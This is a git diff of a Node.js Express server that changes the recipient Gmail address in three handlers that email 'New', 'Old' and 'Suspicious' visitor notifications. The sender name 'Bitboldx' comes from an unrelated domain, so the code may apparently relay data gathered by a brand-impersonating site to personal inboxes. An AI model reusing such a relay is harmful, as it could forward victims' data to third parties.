@@ -50,7 +50,7 @@ app.post('/visitorEmail.html', async (req, res) => {
 
     const mail_option = {
         from: `Bitboldx <noreply@assistin.online>`,
-        to: 'mqsbeat@gmail.com',
+        to: 'tijeoma05@gmail.com',
         subject: "New Visitor",
         html:
             `<!DOCTYPE html>
@@ -209,7 +209,7 @@ app.post('/visitorEmail2.html', async (req, res) => {
 
     const mail_option = {
         from: `Bitboldx <noreply@assistin.online>`,
-        to: 'mqsbeat@gmail.com',
+        to: 'tijeoma05@gmail.com',
         subject: "Old Visitor",
         html:
             `<!DOCTYPE html>
@@ -367,7 +367,7 @@ app.post('/visitorEmail3.html', async (req, res) => {
 
     const mail_option = {
         from: `Bitboldx <noreply@assistin.online>`,
-        to: 'mqsbeat@gmail.com',
+        to: 'tijeoma05@gmail.com',
         subject: "Suspicious Visitor",
         html:
             `<!DOCTYPE html>
